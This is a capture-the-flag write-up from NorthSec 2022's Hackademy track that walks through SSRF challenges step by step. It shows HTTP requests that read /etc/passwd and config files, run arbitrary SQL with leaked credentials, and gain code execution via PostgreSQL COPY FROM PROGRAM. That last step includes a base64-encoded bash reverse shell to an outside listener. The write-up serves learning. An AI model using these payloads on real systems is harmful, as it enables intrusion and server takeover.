---
layout: post
title: NorthSec 2022 Writeup - Hackademy - Forgery
date: 2022-05-23
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2022/05/NorthSec/HackademyForgery
img: 2022/05/NorthSec/Forgery/Forgery.png
---

The Hackademy challenges are the beginner's track at the NorthSec CTF. I had done a few last year. But I had not done the [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf) challenges.

## Forgery 101 - Find the source

I opened the challenges website. 

![Site](/assets/images/2022/05/NorthSec/Forgery/Site.png "Site")

The site allowed running a few commands on the server. I tried running `id` instead of the listed commands, but that failed. 

Looking at the site and the request sent, it looked like the backend was sending requests to 'http://localhost/api.php' to execute the allowed commands. That, and the name of the challenges pointed at SSRF. 

I tried using it to load a file on the server. 

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 45
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=file:///etc/passwd&method=GET&postparams=
```

It worked. 

```http
HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:23:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1469
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

The challenge name said to find the source, so I tried to load demo.php, but it failed. I needed the get the path of the application. So I used the vulnerability to read the Apache configuration. 

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=file:///etc/apache2/sites-enabled/000-default.conf&method=GET&postparams=
```

There was two application running on the server. 

```http
HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:23:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 309
Connection: close
Content-Type: text/html; charset=UTF-8

<VirtualHost *:80>
	ServerName localhost
	DocumentRoot /var/www/html/api
</VirtualHost>

<VirtualHost *:8080>
	ServerName localhost
	DocumentRoot /var/www/html/database

	<Directory /var/www/html/database>
		Order deny,allow
		Deny from all
		Allow from ::1
		Allow from localhost
	</Directory>
</VirtualHost>
```

Now that I knew where the main application was, I used it to dump all the PHP files I could find. 


#### api.php
```php
<?php 
    require_once("config.php");

    if(isset($_GET["run"])){
        $run = strtolower($_GET["run"]);
        if($run === "ping"){
            echo "Pong!";
            die();
        } elseif($run === "hello"){
            echo "World!";
            die();
        } elseif($run === "healthcheck"){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://".DATABASE_HOST.":".DATABASE_PORT."");
            curl_setopt($ch, CURLOPT_POSTFIELDS, "user=".DATABASE_USER."&password=".urlencode(DATABASE_PASSWORD));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $output = curl_exec($ch);
            curl_close($ch);
            echo $output;
            die();
        } else {
            echo "This command is not implemented in our system. Wait some more years and try again, young apprentice.";
            die();
        }
    }
```

#### demo.php
```
<?php 
    if(isset($_POST["url"], $_POST["method"], $_POST["postparams"])){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $_POST["url"]);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if(strtoupper($_POST["method"]) === "GET"){

        } elseif(strtoupper($_POST["method"]) === "POST"){
            curl_setopt($ch, CURLOPT_POST, TRUE);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $_POST["postparams"]);
        } else {
            echo "Only GET and POST are implemented so far...";
            die();
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

        $output = curl_exec($ch);
        curl_close($ch);
        echo $output;
        die();
    }
```

#### config.php
```php
<?php 
#FLAG-9fc7c9b51435bd468ced68ea0112996a (1/3)
define("DATABASE_USER", "postgres");
define("DATABASE_PASSWORD", "Let&me=in");
define("DATABASE_HOST", "localhost");
define("DATABASE_PORT", 8080);
```

The first flag was in a comment in `config.php`.

## Forgery 102 - Can you query in the library?

The second challenge was about sending queries to the database. The main application was already sending requests to a second site to get the database endpoint. The config file also had the user name and password needed to access that second application. The port 8080 was not opened, but I could use the SSRF to access it. 

First I dumped the content of the `database/index.php` file. 

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=file:///var/www/html/database/index.php&method=GET&postparams=
```

##### index.php
```php
<?php 
    if(isset($_POST['user'], $_POST['password'])) {
        try{
            $conn = new PDO("pgsql:host=localhost;port=5432;", $_POST['user'], $_POST['password'], array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
        } catch (PDOException $e){
            echo "You are not authorized to access this, get out!";
            die();
        }
        if(isset($_POST["query"])){
            try{
                $cursor = $conn->query($_POST["query"]);
                $results = $cursor->fetchall(PDO::FETCH_ASSOC);
                if(!empty($results)){
                    $columns = array_keys($results[0]);
                    echo implode(" | ", $columns)."\n";
                    foreach ($results as $key => $value) {
                        echo implode(" | ", $value)."\n";
                    }
                }
            } catch(PDOException $e) {
                echo "Seems like your query failed, try again young pentester!";
                die();
            }
        } else {
            echo "Yes, yes.. I'm alive. What is it?";
            die();
        }
    } else {
        echo "Only a real pentester can access the database.";
        die();
    }
```

The file supported three post parameters: user, password, and query. I could use it to run any SQL command on the database. I used it to get the list of tables in the database. 

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 194
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=http%3A%2F%2Flocalhost:8080%3Frun%3Dhealthcheck&method=POST&postparams=user%3Dpostgres%26password%3DLet%2526me%253Din%26query%3DSELECT TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.TABLES
```

There were a lot of them, but the interesting one came first.

```http
HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:47:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 6523
Connection: close
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:47:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 6350
Content-Type: text/html; charset=UTF-8

table_schema | table_name
flag | flag_25bb3839f80731bb
pg_catalog | pg_statistic
pg_catalog | pg_type
...
```

The was a schema called `flag` that had a table named `flag_25bb3839f80731bb`. I used the same technique to read that table.

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 172
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=http%3A%2F%2Flocalhost:8080%3Frun%3Dhealthcheck&method=POST&postparams=user%3Dpostgres%26password%3DLet%2526me%253Din%26query%3DSELECT * FROM flag.flag_25bb3839f80731bb
```

It gave me the second flag.

```http
HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:49:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 214
Connection: close
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 21 May 2022 13:49:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 66
Content-Type: text/html; charset=UTF-8

flag_42321a36fb59ea85
FLAG-effafb6605f287adec9426f9feb8ed9e (2/3)
```

## Forgery 103 - Obtain HRCE: Hackademy Recognized Certified Expert

The name of the last challenge of the track hinted at [Remote Code Execution (RCE)](https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/). From the `pg_*` schema and table names, I knew that the site was using PostgreSQL. I looked for ways to get RCE on PostgreSQL and [found a small script on GitHub](https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py). 

This script uses [COPY FROM PROGRAM](https://www.postgresql.org/docs/current/sql-copy.html) to execute a command and save the output in a table.

I did not really care about the output, but the command needed a table, so I started by creating one. It also helped my test by first running `id` on the server. 

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 171
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=http%3A%2F%2Flocalhost:8080%3Frun%3Dhealthcheck&method=POST&postparams=user%3Dpostgres%26password%3DLet%2526me%253Din%26query%3D CREATE TABLE cmd_exec(cmd_output text)
```

When I knew I could run commands on the server, I crafted a reverse shell payload. I base64 encoded it to avoid having to fight with any characters that could have caused problems in the HTML request.

```bash
$ echo 'bash  -i >& /dev/tcp/9000:cafe:1234:5678:216:3eff:fe66:7c01/4444  0>&1 ' | base64 -w 0
YmFzaCAgLWkgPiYgL2Rldi90Y3AvOTAwMDpjYWZlOjEyMzQ6NTY3ODoyMTY6M2VmZjpmZTY2OjdjMDEvNDQ0NCAgMD4mMSAK
```

I started a netcat listener on the server provided by the CTF and sent the command.

```http
POST /demo.php HTTP/1.1
Host: chal7.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 282
Origin: http://chal7.hackademy.ctf
Connection: close
Referer: http://chal7.hackademy.ctf/

url=http%3A%2F%2Flocalhost:8080%3Frun%3Dhealthcheck&method=POST&postparams=user%3Dpostgres%26password%3DLet%2526me%253Din%26query%3D COPY cmd_exec FROM PROGRAM 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvOTAwMDpjYWZlOjEyMzQ6NTY3ODoyMTY6M2VmZjpmZTY2OjdjMDEvNDQ0NCAgMD4mMSAK | base64 -d | bash'
```

The listener got a connection. 

```bash
root@ctn-shell:~# nc -6 -klvnp 4444                       
Listening on :: 4444                                      
Connection received on 9000:91a:201:cdba:216:3eff:fe04:eca8 39640
bash: cannot set terminal process group (3616): Inappropriate ioctl for device
bash: no job control in this shell                        
```

At that point, I just had to look around the server to find the last flag. 

```bash
postgres@ctn-mbergeron-hackademy-7:/var/lib/postgresql/12/main$ ls  
ls                                                        
base                                                      
global                                                    
pg_commit_ts                                              
pg_dynshmem                                               
pg_logical                                                
...

postgres@ctn-mbergeron-hackademy-7:/var/lib/postgresql/12/main$ cd
cd                                                        
bash: cd: HOME not set                                    

postgres@ctn-mbergeron-hackademy-7:/var/lib/postgresql/12/main$ cd /
cd /                                                      

postgres@ctn-mbergeron-hackademy-7:/$ ls
ls                                                        
bin                                                       
boot                                                      
dev                                                       
etc                                                       
flag_is_in_here_3050e4ea44c9439d.txt
home                                                      
lib                                                       
lib32                                                     
...

postgres@ctn-mbergeron-hackademy-7:/$ cat flag_is_in_here_3050e4ea44c9439d.txt
<ademy-7:/$ cat flag_is_in_here_3050e4ea44c9439d.txt
FLAG-224b009bd8229cfd2967ea814ea83e08 (3/3)
```
